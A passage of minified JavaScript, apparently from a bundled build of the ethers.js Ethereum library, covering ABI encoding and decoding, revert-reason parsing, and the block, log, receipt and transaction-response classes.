if(r instanceof pi){const i=I1("function",r),s=zs(r),o=b7(r);let a=[];qs(r,Pr(["returns"])).has("returns")&&(a=zs(r));const c=v7(r);return Tc(r),new qi(vt,i,o,s,a,c)}let n=r.stateMutability;return n==null&&(n="payable",typeof r.constant=="boolean"?(n="view",r.constant||(n="payable",typeof r.payable=="boolean"&&!r.payable&&(n="nonpayable"))):typeof r.payable=="boolean"&&!r.payable&&(n="nonpayable")),new qi(vt,r.name,n,r.inputs?r.inputs.map(ar.from):[],r.outputs?r.outputs.map(ar.from):[],r.gas!=null?r.gas:null)}static isFragment(r){return r&&r[Zr]===k6}}class pc extends S1{constructor(e,r,n){super(e,"struct",r,n),Object.defineProperty(this,Zr,{value:O6})}format(){throw new Error("@TODO")}static from(e){if(typeof e=="string")try{return pc.from(Zo(e))}catch{M(!1,"invalid struct fragment","obj",e)}else if(e instanceof pi){const r=I1("struct",e),n=zs(e);return Tc(e),new pc(vt,r,n)}return new pc(vt,e.name,e.inputs?e.inputs.map(ar.from):[])}static isFragment(e){return e&&e[Zr]===O6}}const wi=new Map;wi.set(0,"GENERIC_PANIC");wi.set(1,"ASSERT_FALSE");wi.set(17,"OVERFLOW");wi.set(18,"DIVIDE_BY_ZERO");wi.set(33,"ENUM_RANGE_ERROR");wi.set(34,"BAD_STORAGE_DATA");wi.set(49,"STACK_UNDERFLOW");wi.set(50,"ARRAY_RANGE_ERROR");wi.set(65,"OUT_OF_MEMORY");wi.set(81,"UNINITIALIZED_FUNCTION_CALL");const Gte=new RegExp(/^bytes([0-9]*)$/),Kte=new RegExp(/^(u?int)([0-9]*)$/);let Tm=null,_6=1024;function Zte(t,e,r,n){let i="missing revert data",s=null;const o=null;let a=null;if(r){i="execution reverted";const l=Ve(r);if(r=ue(r),l.length===0)i+=" (no data present; likely require(false) occurred",s="require(false)";else if(l.length%32!==4)i+=" (could not decode reason; invalid data length)";else if(ue(l.slice(0,4))==="0x08c379a0")try{s=n.decode(["string"],l.slice(4))[0],a={signature:"Error(string)",name:"Error",args:[s]},i+=`: ${JSON.stringify(s)}`}catch{i+=" (could not decode reason; invalid string data)"}else if(ue(l.slice(0,4))==="0x4e487b71")try{const u=Number(n.decode(["uint256"],l.slice(4))[0]);a={signature:"Panic(uint256)",name:"Panic",args:[u]},s=`Panic due to ${wi.get(u)||"UNKNOWN"}(${u})`,i+=`: ${s}`}catch{i+=" (could not decode panic code)"}else i+=" (unknown custom error)"}const c={to:e.to?ot(e.to):null,data:e.data||"0x"};return e.from&&(c.from=ot(e.from)),Et(i,"CALL_EXCEPTION",{action:t,data:r,reason:s,transaction:c,invocation:o,revert:a})}var vo,_l;const Dg=class Dg{constructor(){H(this,vo)}getDefaultValue(e){const r=e.map(i=>Q(this,vo,_l).call(this,ar.from(i)));return new x0(r,"_").defaultValue()}encode(e,r){Z9(r.length,e.length,"types/values length mismatch");const n=e.map(o=>Q(this,vo,_l).call(this,ar.from(o))),i=new x0(n,"_"),s=new tb;return i.encode(s,r),s.data}decode(e,r,n){const i=e.map(o=>Q(this,vo,_l).call(this,ar.from(o)));return new x0(i,"_").decode(new rb(r,n,_6))}static _setDefaultMaxInflation(e){M(typeof e=="number"&&Number.isInteger(e),"invalid defaultMaxInflation factor","value",e),_6=e}static defaultAbiCoder(){return Tm==null&&(Tm=new Dg),Tm}static getBuiltinCallException(e,r,n){return Zte(e,r,n,Dg.defaultAbiCoder())}};vo=new WeakSet,_l=function(e){if(e.isArray())return new yee(Q(this,vo,_l).call(this,e.arrayChildren),e.arrayLength,e.name);if(e.isTuple())return new x0(e.components.map(n=>Q(this,vo,_l).call(this,n)),e.name);switch(e.baseType){case"address":return new wee(e.name);case"bool":return new bee(e.name);case"string":return new Pee(e.name);case"bytes":return new vee(e.name);case"":return new Aee(e.name)}let r=e.type.match(Kte);if(r){let n=parseInt(r[2]||"256");return M(n!==0&&n<=256&&n%8===0,"invalid "+r[1]+" bit length","param",e),new Nee(n/8,r[1]==="int",e.name)}if(r=e.type.match(Gte),r){let n=parseInt(r[1]);return M(n!==0&&n<=32,"invalid bytes length","param",e),new Eee(n,e.name)}M(!1,"invalid type","type",e.type)};let Af=Dg;class Jte{constructor(e,r,n){j(this,"fragment");j(this,"name");j(this,"signature");j(this,"topic");j(this,"args");const i=e.name,s=e.format();Ce(this,{fragment:e,name:i,signature:s,topic:r,args:n})}}class Qte{constructor(e,r,n,i){j(this,"fragment");j(this,"name");j(this,"args");j(this,"signature");j(this,"selector");j(this,"value");const s=e.name,o=e.format();Ce(this,{fragment:e,name:s,args:n,signature:o,selector:r,value:i})}}class Yte{constructor(e,r,n){j(this,"fragment");j(this,"name");j(this,"args");j(this,"signature");j(this,"selector");const i=e.name,s=e.format();Ce(this,{fragment:e,name:i,args:n,signature:s,selector:r})}}class T6{constructor(e){j(this,"hash");j(this,"_isIndexed");Ce(this,{hash:e,_isIndexed:!0})}static isIndexed(e){return!!(e&&e._isIndexed)}}const $6={0:"generic panic",1:"assert(false)",17:"arithmetic overflow",18:"division or modulo by zero",33:"enum overflow",34:"invalid encoded storage byte array accessed",49:"out-of-bounds array access; popping on an empty array",50:"out-of-bounds access of an array or bytesN",65:"out of memory",81:"uninitialized function"},R6={"0x08c379a0":{signature:"Error(string)",name:"Error",inputs:["string"],reason:t=>`reverted with reason string ${JSON.stringify(t)}`},"0x4e487b71":{signature:"Panic(uint256)",name:"Panic",inputs:["uint256"],reason:t=>{let e="unknown panic code";return t>=0&&t<=255&&$6[t.toString()]&&(e=$6[t.toString()]),`reverted with panic code 0x${t.toString(16)} (${e})`}}};var $i,Ri,Di,pr,Gi,j0,H0;const _a=class _a{constructor(e){H(this,Gi);j(this,"fragments");j(this,"deploy");j(this,"fallback");j(this,"receive");H(this,$i);H(this,Ri);H(this,Di);H(this,pr);let r=[];typeof e=="string"?r=JSON.parse(e):r=e,$(this,Di,new Map),$(this,$i,new Map),$(this,Ri,new Map);const n=[];for(const o of r)try{n.push($c.from(o))}catch(a){console.log(`[Warning] Invalid Fragment ${JSON.stringify(o)}:`,a.message)}Ce(this,{fragments:Object.freeze(n)});let i=null,s=!1;$(this,pr,this.getAbiCoder()),this.fragments.forEach((o,a)=>{let c;switch(o.type){case"constructor":if(this.deploy){console.log("duplicate definition - constructor");return}Ce(this,{deploy:o});return;case"fallback":o.inputs.length===0?s=!0:(M(!i||o.payable!==i.payable,"conflicting fallback fragments",`fragments[${a}]`,o),i=o,s=i.payable);return;case"function":c=A(this,Di);break;case"event":c=A(this,Ri);break;case"error":c=A(this,$i);break;default:return}const l=o.format();c.has(l)||c.set(l,o)}),this.deploy||Ce(this,{deploy:Ds.from("constructor()")}),Ce(this,{fallback:i,receive:s})}format(e){const r=e?"minimal":"full";return this.fragments.map(i=>i.format(r))}formatJson(){const e=this.fragments.map(r=>r.format("json"));return JSON.stringify(e.map(r=>JSON.parse(r)))}getAbiCoder(){return Af.defaultAbiCoder()}getFunctionName(e){const r=Q(this,Gi,j0).call(this,e,null,!1);return M(r,"no matching function","key",e),r.name}hasFunction(e){return!!Q(this,Gi,j0).call(this,e,null,!1)}getFunction(e,r){return Q(this,Gi,j0).call(this,e,r||null,!0)}forEachFunction(e){const r=Array.from(A(this,Di).keys());r.sort((n,i)=>n.localeCompare(i));for(let n=0;n<r.length;n++){const i=r[n];e(A(this,Di).get(i),n)}}getEventName(e){const r=Q(this,Gi,H0).call(this,e,null,!1);return M(r,"no matching event","key",e),r.name}hasEvent(e){return!!Q(this,Gi,H0).call(this,e,null,!1)}getEvent(e,r){return Q(this,Gi,H0).call(this,e,r||null,!0)}forEachEvent(e){const r=Array.from(A(this,Ri).keys());r.sort((n,i)=>n.localeCompare(i));for(let n=0;n<r.length;n++){const i=r[n];e(A(this,Ri).get(i),n)}}getError(e,r){if(gt(e)){const i=e.toLowerCase();if(R6[i])return Gr.from(R6[i].signature);for(const s of A(this,$i).values())if(i===s.selector)return s;return null}if(e.indexOf("(")===-1){const i=[];for(const[s,o]of A(this,$i))s.split("(")[0]===e&&i.push(o);if(i.length===0)return e==="Error"?Gr.from("error Error(string)"):e==="Panic"?Gr.from("error Panic(uint256)"):null;if(i.length>1){const s=i.map(o=>JSON.stringify(o.format())).join(", ");M(!1,`ambiguous error description (i.e. ${s})`,"name",e)}return i[0]}if(e=Gr.from(e).format(),e==="Error(string)")return Gr.from("error Error(string)");if(e==="Panic(uint256)")return Gr.from("error Panic(uint256)");const n=A(this,$i).get(e);return n||null}forEachError(e){const r=Array.from(A(this,$i).keys());r.sort((n,i)=>n.localeCompare(i));for(let n=0;n<r.length;n++){const i=r[n];e(A(this,$i).get(i),n)}}_decodeParams(e,r){return A(this,pr).decode(e,r)}_encodeParams(e,r){return A(this,pr).encode(e,r)}encodeDeploy(e){return this._encodeParams(this.deploy.inputs,e||[])}decodeErrorResult(e,r){if(typeof e=="string"){const n=this.getError(e);M(n,"unknown error","fragment",e),e=n}return M(Ct(r,0,4)===e.selector,`data signature does not match error ${e.name}.`,"data",r),this._decodeParams(e.inputs,Ct(r,4))}encodeErrorResult(e,r){if(typeof e=="string"){const n=this.getError(e);M(n,"unknown error","fragment",e),e=n}return Ot([e.selector,this._encodeParams(e.inputs,r||[])])}decodeFunctionData(e,r){if(typeof e=="string"){const n=this.getFunction(e);M(n,"unknown function","fragment",e),e=n}return M(Ct(r,0,4)===e.selector,`data signature does not match function ${e.name}.`,"data",r),this._decodeParams(e.inputs,Ct(r,4))}encodeFunctionData(e,r){if(typeof e=="string"){const n=this.getFunction(e);M(n,"unknown function","fragment",e),e=n}return Ot([e.selector,this._encodeParams(e.inputs,r||[])])}decodeFunctionResult(e,r){if(typeof e=="string"){const s=this.getFunction(e);M(s,"unknown function","fragment",e),e=s}let n="invalid length for result data";const i=xr(r);if(i.length%32===0)try{return A(this,pr).decode(e.outputs,i)}catch{n="could not decode result data"}K(!1,n,"BAD_DATA",{value:ue(i),info:{method:e.name,signature:e.format()}})}makeError(e,r){const n=Ve(e,"data"),i=Af.getBuiltinCallException("call",r,n);if(i.message.startsWith("execution reverted (unknown custom error)")){const a=ue(n.slice(0,4)),c=this.getError(a);if(c)try{const l=A(this,pr).decode(c.inputs,n.slice(4));i.revert={name:c.name,signature:c.format(),args:l},i.reason=i.revert.signature,i.message=`execution reverted: ${i.reason}`}catch{i.message="execution reverted (coult not decode custom error)"}}const o=this.parseTransaction(r);return o&&(i.invocation={method:o.name,signature:o.signature,args:o.args}),i}encodeFunctionResult(e,r){if(typeof e=="string"){const n=this.getFunction(e);M(n,"unknown function","fragment",e),e=n}return ue(A(this,pr).encode(e.outputs,r||[]))}encodeFilterTopics(e,r){if(typeof e=="string"){const s=this.getEvent(e);M(s,"unknown event","eventFragment",e),e=s}K(r.length<=e.inputs.length,`too many arguments for ${e.format()}`,"UNEXPECTED_ARGUMENT",{count:r.length,expectedCount:e.inputs.length});const n=[];e.anonymous||n.push(e.topicHash);const i=(s,o)=>s.type==="string"?_c(o):s.type==="bytes"?$t(ue(o)):(s.type==="bool"&&typeof o=="boolean"?o=o?"0x01":"0x00":s.type.match(/^u?int/)?o=qo(o):s.type.match(/^bytes/)?o=bY(o,32):s.type==="address"&&A(this,pr).encode(["address"],[o]),kc(ue(o),32));for(r.forEach((s,o)=>{const a=e.inputs[o];if(!a.indexed){M(s==null,"cannot filter non-indexed parameters; must be null","contract."+a.name,s);return}s==null?n.push(null):a.baseType==="array"||a.baseType==="tuple"?M(!1,"filtering with tuples or arrays not supported","contract."+a.name,s):Array.isArray(s)?n.push(s.map(c=>i(a,c))):n.push(i(a,s))});n.length&&n[n.length-1]===null;)n.pop();return n}encodeEventLog(e,r){if(typeof e=="string"){const o=this.getEvent(e);M(o,"unknown event","eventFragment",e),e=o}const n=[],i=[],s=[];return e.anonymous||n.push(e.topicHash),M(r.length===e.inputs.length,"event arguments/values mismatch","values",r),e.inputs.forEach((o,a)=>{const c=r[a];if(o.indexed)if(o.type==="string")n.push(_c(c));else if(o.type==="bytes")n.push($t(c));else{if(o.baseType==="tuple"||o.baseType==="array")throw new Error("not implemented");n.push(A(this,pr).encode([o.type],[c]))}else i.push(o),s.push(c)}),{data:A(this,pr).encode(i,s),topics:n}}decodeEventLog(e,r,n){if(typeof e=="string"){const f=this.getEvent(e);M(f,"unknown event","eventFragment",e),e=f}if(n!=null&&!e.anonymous){const f=e.topicHash;M(gt(n[0],32)&&n[0].toLowerCase()===f,"fragment/topic mismatch","topics[0]",n[0]),n=n.slice(1)}const i=[],s=[],o=[];e.inputs.forEach((f,g)=>{f.indexed?f.type==="string"||f.type==="bytes"||f.baseType==="tuple"||f.baseType==="array"?(i.push(ar.from({type:"bytes32",name:f.name})),o.push(!0)):(i.push(f),o.push(!1)):(s.push(f),o.push(!1))});const a=n!=null?A(this,pr).decode(i,Ot(n)):null,c=A(this,pr).decode(s,r,!0),l=[],u=[];let h=0,d=0;return e.inputs.forEach((f,g)=>{let p=null;if(f.indexed)if(a==null)p=new T6(null);else if(o[g])p=new T6(a[d++]);else try{p=a[d++]}catch(w){p=w}else try{p=c[h++]}catch(w){p=w}l.push(p),u.push(f.name||null)}),Yu.fromItems(l,u)}parseTransaction(e){const r=Ve(e.data,"tx.data"),n=ge(e.value!=null?e.value:0,"tx.value"),i=this.getFunction(ue(r.slice(0,4)));if(!i)return null;const s=A(this,pr).decode(i.inputs,r.slice(4));return new Qte(i,i.selector,s,n)}parseCallResult(e){throw new Error("@TODO")}parseLog(e){const r=this.getEvent(e.topics[0]);return!r||r.anonymous?null:new Jte(r,r.topicHash,this.decodeEventLog(r,e.data,e.topics))}parseError(e){const r=ue(e),n=this.getError(Ct(r,0,4));if(!n)return null;const i=A(this,pr).decode(n.inputs,Ct(r,4));return new Yte(n,n.selector,i)}static from(e){return e instanceof _a?e:typeof e=="string"?new _a(JSON.parse(e)):typeof e.formatJson=="function"?new _a(e.formatJson()):typeof e.format=="function"?new _a(e.format("json")):new _a(e)}};$i=new WeakMap,Ri=new WeakMap,Di=new WeakMap,pr=new WeakMap,Gi=new WeakSet,j0=function(e,r,n){if(gt(e)){const s=e.toLowerCase();for(const o of A(this,Di).values())if(s===o.selector)return o;return null}if(e.indexOf("(")===-1){const s=[];for(const[o,a]of A(this,Di))o.split("(")[0]===e&&s.push(a);if(r){const o=r.length>0?r[r.length-1]:null;let a=r.length,c=!0;mr.isTyped(o)&&o.type==="overrides"&&(c=!1,a--);for(let l=s.length-1;l>=0;l--){const u=s[l].inputs.length;u!==a&&(!c||u!==a-1)&&s.splice(l,1)}for(let l=s.length-1;l>=0;l--){const u=s[l].inputs;for(let h=0;h<r.length;h++)if(mr.isTyped(r[h])){if(h>=u.length){if(r[h].type==="overrides")continue;s.splice(l,1);break}if(r[h].type!==u[h].baseType){s.splice(l,1);break}}}}if(s.length===1&&r&&r.length!==s[0].inputs.length){const o=r[r.length-1];(o==null||Array.isArray(o)||typeof o!="object")&&s.splice(0,1)}if(s.length===0)return null;if(s.length>1&&n){const o=s.map(a=>JSON.stringify(a.format())).join(", ");M(!1,`ambiguous function description (i.e. matches ${o})`,"key",e)}return s[0]}const i=A(this,Di).get(qi.from(e).format());return i||null},H0=function(e,r,n){if(gt(e)){const s=e.toLowerCase();for(const o of A(this,Ri).values())if(s===o.topicHash)return o;return null}if(e.indexOf("(")===-1){const s=[];for(const[o,a]of A(this,Ri))o.split("(")[0]===e&&s.push(a);if(r){for(let o=s.length-1;o>=0;o--)s[o].inputs.length<r.length&&s.splice(o,1);for(let o=s.length-1;o>=0;o--){const a=s[o].inputs;for(let c=0;c<r.length;c++)if(mr.isTyped(r[c])&&r[c].type!==a[c].baseType){s.splice(o,1);break}}}if(s.length===0)return null;if(s.length>1&&n){const o=s.map(a=>JSON.stringify(a.format())).join(", ");M(!1,`ambiguous event description (i.e. matches ${o})`,"key",e)}return s[0]}const i=A(this,Ri).get(Hi.from(e).format());return i||null};let wb=_a;const E7=BigInt(0);function Zl(t){return t??null}function At(t){return t==null?null:t.toString()}class D6{constructor(e,r,n){j(this,"gasPrice");j(this,"maxFeePerGas");j(this,"maxPriorityFeePerGas");Ce(this,{gasPrice:Zl(e),maxFeePerGas:Zl(r),maxPriorityFeePerGas:Zl(n)})}toJSON(){const{gasPrice:e,maxFeePerGas:r,maxPriorityFeePerGas:n}=this;return{_type:"FeeData",gasPrice:At(e),maxFeePerGas:At(r),maxPriorityFeePerGas:At(n)}}}function Pg(t){const e={};t.to&&(e.to=t.to),t.from&&(e.from=t.from),t.data&&(e.data=ue(t.data));const r="chainId,gasLimit,gasPrice,maxFeePerBlobGas,maxFeePerGas,maxPriorityFeePerGas,value".split(/,/);for(const i of r)!(i in t)||t[i]==null||(e[i]=ge(t[i],`request.${i}`));const n="type,nonce".split(/,/);for(const i of n)!(i in t)||t[i]==null||(e[i]=Re(t[i],`request.${i}`));return t.accessList&&(e.accessList=Fc(t.accessList)),"blockTag"in t&&(e.blockTag=t.blockTag),"enableCcipRead"in t&&(e.enableCcipRead=!!t.enableCcipRead),"customData"in t&&(e.customData=t.customData),"blobVersionedHashes"in t&&t.blobVersionedHashes&&(e.blobVersionedHashes=t.blobVersionedHashes.slice()),"kzg"in t&&(e.kzg=t.kzg),"blobs"in t&&t.blobs&&(e.blobs=t.blobs.map(i=>S2(i)?ue(i):Object.assign({},i))),e}var Ss;class Xte{constructor(e,r){j(this,"provider");j(this,"number");j(this,"hash");j(this,"timestamp");j(this,"parentHash");j(this,"parentBeaconBlockRoot");j(this,"nonce");j(this,"difficulty");j(this,"gasLimit");j(this,"gasUsed");j(this,"stateRoot");j(this,"receiptsRoot");j(this,"blobGasUsed");j(this,"excessBlobGas");j(this,"miner");j(this,"prevRandao");j(this,"extraData");j(this,"baseFeePerGas");H(this,Ss);$(this,Ss,e.transactions.map(n=>typeof n!="string"?new xf(n,r):n)),Ce(this,{provider:r,hash:Zl(e.hash),number:e.number,timestamp:e.timestamp,parentHash:e.parentHash,parentBeaconBlockRoot:e.parentBeaconBlockRoot,nonce:e.nonce,difficulty:e.difficulty,gasLimit:e.gasLimit,gasUsed:e.gasUsed,blobGasUsed:e.blobGasUsed,excessBlobGas:e.excessBlobGas,miner:e.miner,prevRandao:Zl(e.prevRandao),extraData:e.extraData,baseFeePerGas:Zl(e.baseFeePerGas),stateRoot:e.stateRoot,receiptsRoot:e.receiptsRoot})}get transactions(){return A(this,Ss).map(e=>typeof e=="string"?e:e.hash)}get prefetchedTransactions(){const e=A(this,Ss).slice();return e.length===0?[]:(K(typeof e[0]=="object","transactions were not prefetched with block request","UNSUPPORTED_OPERATION",{operation:"transactionResponses()"}),e)}toJSON(){const{baseFeePerGas:e,difficulty:r,extraData:n,gasLimit:i,gasUsed:s,hash:o,miner:a,prevRandao:c,nonce:l,number:u,parentHash:h,parentBeaconBlockRoot:d,stateRoot:f,receiptsRoot:g,timestamp:p,transactions:w}=this;return{_type:"Block",baseFeePerGas:At(e),difficulty:At(r),extraData:n,gasLimit:At(i),gasUsed:At(s),blobGasUsed:At(this.blobGasUsed),excessBlobGas:At(this.excessBlobGas),hash:o,miner:a,prevRandao:c,nonce:l,number:u,parentHash:h,timestamp:p,parentBeaconBlockRoot:d,stateRoot:f,receiptsRoot:g,transactions:w}}[Symbol.iterator](){let e=0;const r=this.transactions;return{next:()=>e<this.length?{value:r[e++],done:!1}:{value:void 0,done:!0}}}get length(){return A(this,Ss).length}get date(){return this.timestamp==null?null:new Date(this.timestamp*1e3)}async getTransaction(e){let r;if(typeof e=="number")r=A(this,Ss)[e];else{const n=e.toLowerCase();for(const i of A(this,Ss))if(typeof i=="string"){if(i!==n)continue;r=i;break}else{if(i.hash!==n)continue;r=i;break}}if(r==null)throw new Error("no such tx");return typeof r=="string"?await this.provider.getTransaction(r):r}getPrefetchedTransaction(e){const r=this.prefetchedTransactions;if(typeof e=="number")return r[e];e=e.toLowerCase();for(const n of r)if(n.hash===e)return n;M(!1,"no matching transaction","indexOrHash",e)}isMined(){return!!this.hash}isLondon(){return!!this.baseFeePerGas}orphanedEvent(){if(!this.isMined())throw new Error("");return ere(this)}}Ss=new WeakMap;class cp{constructor(e,r){j(this,"provider");j(this,"transactionHash");j(this,"blockHash");j(this,"blockNumber");j(this,"removed");j(this,"address");j(this,"data");j(this,"topics");j(this,"index");j(this,"transactionIndex");this.provider=r;const n=Object.freeze(e.topics.slice());Ce(this,{transactionHash:e.transactionHash,blockHash:e.blockHash,blockNumber:e.blockNumber,removed:e.removed,address:e.address,data:e.data,topics:n,index:e.index,transactionIndex:e.transactionIndex})}toJSON(){const{address:e,blockHash:r,blockNumber:n,data:i,index:s,removed:o,topics:a,transactionHash:c,transactionIndex:l}=this;return{_type:"log",address:e,blockHash:r,blockNumber:n,data:i,index:s,removed:o,topics:a,transactionHash:c,transactionIndex:l}}async getBlock(){const e=await this.provider.getBlock(this.blockHash);return K(!!e,"failed to find transaction","UNKNOWN_ERROR",{}),e}async getTransaction(){const e=await this.provider.getTransaction(this.transactionHash);return K(!!e,"failed to find transaction","UNKNOWN_ERROR",{}),e}async getTransactionReceipt(){const e=await this.provider.getTransactionReceipt(this.transactionHash);return K(!!e,"failed to find transaction receipt","UNKNOWN_ERROR",{}),e}removedEvent(){return tre(this)}}var Of;class C7{constructor(e,r){j(this,"provider");j(this,"to");j(this,"from");j(this,"contractAddress");j(this,"hash");j(this,"index");j(this,"blockHash");j(this,"blockNumber");j(this,"logsBloom");j(this,"gasUsed");j(this,"blobGasUsed");j(this,"cumulativeGasUsed");j(this,"gasPrice");j(this,"blobGasPrice");j(this,"type");j(this,"status");j(this,"root");H(this,Of);$(this,Of,Object.freeze(e.logs.map(i=>new cp(i,r))));let n=E7;e.effectiveGasPrice!=null?n=e.effectiveGasPrice:e.gasPrice!=null&&(n=e.gasPrice),Ce(this,{provider:r,to:e.to,from:e.from,contractAddress:e.contractAddress,hash:e.hash,index:e.index,blockHash:e.blockHash,blockNumber:e.blockNumber,logsBloom:e.logsBloom,gasUsed:e.gasUsed,cumulativeGasUsed:e.cumulativeGasUsed,blobGasUsed:e.blobGasUsed,gasPrice:n,blobGasPrice:e.blobGasPrice,type:e.type,status:e.status,root:e.root})}get logs(){return A(this,Of)}toJSON(){const{to:e,from:r,contractAddress:n,hash:i,index:s,blockHash:o,blockNumber:a,logsBloom:c,logs:l,status:u,root:h}=this;return{_type:"TransactionReceipt",blockHash:o,blockNumber:a,contractAddress:n,cumulativeGasUsed:At(this.cumulativeGasUsed),from:r,gasPrice:At(this.gasPrice),blobGasUsed:At(this.blobGasUsed),blobGasPrice:At(this.blobGasPrice),gasUsed:At(this.gasUsed),hash:i,index:s,logs:l,logsBloom:c,root:h,status:u,to:e}}get length(){return this.logs.length}[Symbol.iterator](){let e=0;return{next:()=>e<this.length?{value:this.logs[e++],done:!1}:{value:void 0,done:!0}}}get fee(){return this.gasUsed*this.gasPrice}async getBlock(){const e=await this.provider.getBlock(this.blockHash);if(e==null)throw new Error("TODO");return e}async getTransaction(){const e=await this.provider.getTransaction(this.hash);if(e==null)throw new Error("TODO");return e}async getResult(){return await this.provider.getTransactionResult(this.hash)}async confirmations(){return await this.provider.getBlockNumber()-this.blockNumber+1}removedEvent(){return x7(this)}reorderedEvent(e){return K(!e||e.isMined(),"unmined 'other' transction cannot be orphaned","UNSUPPORTED_OPERATION",{operation:"reorderedEvent(other)"}),A7(this,e)}}Of=new WeakMap;var Eo;const Z2=class Z2{constructor(e,r){j(this,"provider");j(this,"blockNumber");j(this,"blockHash");j(this,"index");j(this,"hash");j(this,"type");j(this,"to");j(this,"from");j(this,"nonce");j(this,"gasLimit");j(this,"gasPrice");j(this,"maxPriorityFeePerGas");j(this,"maxFeePerGas");j(this,"maxFeePerBlobGas");j(this,"data");j(this,"value");j(this,"chainId");j(this,"signature");j(this,"accessList");j(this,"blobVersionedHashes");H(this,Eo);this.provider=r,this.blockNumber=e.blockNumber!=null?e.blockNumber:null,this.blockHash=e.blockHash!=null?e.blockHash:null,this.hash=e.hash,this.index=e.index,this.type=e.type,this.from=e.from,this.to=e.to||null,this.gasLimit=e.gasLimit,this.nonce=e.nonce,this.data=e.data,this.value=e.value,this.gasPrice=e.gasPrice,this.maxPriorityFeePerGas=e.maxPriorityFeePerGas!=null?e.maxPriorityFeePerGas:null,this.maxFeePerGas=e.maxFeePerGas!=null?e.maxFeePerGas:null,this.maxFeePerBlobGas=e.maxFeePerBlobGas!=null?e.maxFeePerBlobGas:null,this.chainId=e.chainId,this.signature=e.signature,this.accessList=e.accessList!=null?e.accessList:null,this.blobVersionedHashes=e.blobVersionedHashes!=null?e.blobVersionedHashes:null,$(this,Eo,-1)}toJSON(){const{blockNumber:e,blockHash:r,index:n,hash:i,type:s,to:o,from:a,nonce:c,data:l,signature:u,accessList:h,blobVersionedHashes:d}=this;return{_type:"TransactionResponse",accessList:h,blockNumber:e,blockHash:r,blobVersionedHashes:d,chainId:At(this.chainId),data:l,from:a,gasLimit:At(this.gasLimit),gasPrice:At(this.gasPrice),hash:i,maxFeePerGas:At(this.maxFeePerGas),maxPriorityFeePerGas:At(this.maxPriorityFeePerGas),maxFeePerBlobGas:At(this.maxFeePerBlobGas),nonce:c,signature:u,to:o,index:n,type:s,value:At(this.value)}}async getBlock(){let e=this.blockNumber;if(e==null){const n=await this.getTransaction();n&&(e=n.blockNumber)}if(e==null)return null;const r=this.provider.getBlock(e);if(r==null)throw new Error("TODO");return r}async getTransaction(){return this.provider.getTransaction(this.hash)}async confirmations(){if(this.blockNumber==null){const{tx:r,blockNumber:n}=await Ar({tx:this.getTransaction(),blockNumber:this.provider.getBlockNumber()});return r==null||r.blockNumber==null?0:n-r.blockNumber+1}return await this.provider.getBlockNumber()-this.blockNumber+1}async wait(e,r){const n=e??1,i=r??0;let s=A(this,Eo),o=-1,a=s===-1;const c=async()=>{if(a)return null;const{blockNumber:d,nonce:f}=await Ar({blockNumber:this.provider.getBlockNumber(),nonce:this.provider.getTransactionCount(this.from)});if(f<this.nonce){s=d;return}if(a)return null;const g=await this.getTransaction();if(!(g&&g.blockNumber!=null))for(o===-1&&(o=s-3,o<A(this,Eo)&&(o=A(this,Eo)));o<=d;){if(a)return null;const p=await this.provider.getBlock(o,!0);if(p==null)return;for(const w of p)if(w===this.hash)return;for(let w=0;w<p.length;w++){const m=await p.getTransaction(w);if(m.from===this.from&&m.nonce===this.nonce){if(a)return null;const b=await this.provider.getTransactionReceipt(m.hash);if(b==null||d-b.blockNumber+1<n)return;let v="replaced";m.data===this.data&&m.to===this.to&&m.value===this.value?v="repriced":m.data==="0x"&&m.from===m.to&&m.value===E7&&(v="cancelled"),K(!1,"transaction was replaced","TRANSACTION_REPLACED",{cancelled:v==="replaced"||v==="cancelled",reason:v,replacement:m.replaceableTransaction(s),hash:m.hash,receipt:b})}}o++}},l=d=>{if(d==null||d.status!==0)return d;K(!1,"transaction execution reverted","CALL_EXCEPTION",{action:"sendTransaction",data:null,reason:null,invocation:null,revert:null,transaction:{to:d.to,from:d.from,data:""},receipt:d})},u=await this.provider.getTransactionReceipt(this.hash);if(n===0)return l(u);if(u){if(await u.confirmations()>=n)return l(u)}else if(await c(),n===0)return null;return await new Promise((d,f)=>{const g=[],p=()=>{g.forEach(m=>m())};if(g.push(()=>{a=!0}),i>0){const m=setTimeout(()=>{p(),f(Et("wait for transaction timeout","TIMEOUT"))},i);g.push(()=>{clearTimeout(m)})}const w=async m=>{if(await m.confirmations()>=n){p();try{d(l(m))}catch(b){f(b)}}};if(g.push(()=>{this.provider.off(this.hash,w)}),this.provider.on(this.hash,w),s>=0){const m=async()=>{try{await c()}catch(b){if(or(b,"TRANSACTION_REPLACED")){p(),f(b);return}}a||this.provider.once("block",m)};g.push(()=>{this.provider.off("block",m)}),this.provider.once("block",m)}})}isMined(){return this.blockHash!=null}isLegacy(){return this.type===0}isBerlin(){return this.type===1}isLondon(){return this.type===2}isCancun(){return this.type===3}removedEvent(){return K(this.isMined(),"unmined transaction canot be orphaned","UNSUPPORTED_OPERATION",{operation:"removeEvent()"}),x7(this)}reorderedEvent(e){return K(this.isMined(),"unmined transaction canot be orphaned","UNSUPPORTED_OPERATION",{operation:"removeEvent()"}),K(!e||e.isMined(),"unmined 'other' transaction canot be orphaned","UNSUPPORTED_OPERATION",{operation:"removeEvent()"}),A7(this,e)}replaceableTransaction(e){M(Number.isInteger(e)&&e>=0,"invalid startBlock","startBlock",e);const r=new Z2(this,this.provider);return $(r,Eo,e),r}};Eo=new WeakMap;let xf=Z2;function ere(t){return{orphan:"drop-block",hash:t.hash,number:t.number}}function A7(t,e){return{orphan:"reorder-transaction",tx:t,other:e}}function x7(t){return{orphan:"drop-transaction",tx:t}}function tre(t){return{orphan:"drop-log",log:{transactionHash:t.transactionHash,blockHash:t.blockHash,blockNumber:t.blockNumber,address:t.address,data:t.data,topics:Object.freeze(t.topics.slice()),index:t.index}}}class j2 extends cp{constructor(r,n,i){super(r,r.provider);j(this,"interface");j(this,"fragment");j(this,"args");const s=n.decodeEventLog(i,r.data,r.topics);Ce(this,{args:s,fragment:i,interface:n})}get eventName(){return this.fragment.name}get eventSignature(){return this.fragment.format()}}class I7 extends cp{constructor(r,n){super(r,r.provider);j(this,"error");Ce(this,{error:n})}}var Eu;class rre extends C7{constructor(r,n,i){super(i,n);H(this,Eu);$(this,Eu,r)}get logs(){return super.logs.map(r=>{const n=r.topics.length?A(this,Eu).getEvent(r.topics[0]):null;if(n)try{return new j2(r,A(this,Eu),n)}catch(i){return new I7(r,i)}return r})}}Eu=new WeakMap;var _f;class H2 extends xf{constructor(r,n,i){super(i,n);H(this,_f);$(this,_f,r)}async wait(r,n){const i=await super.wait(r,n);return i==null?null:new rre(A(this,_f),this.provider,i)}}_f=new 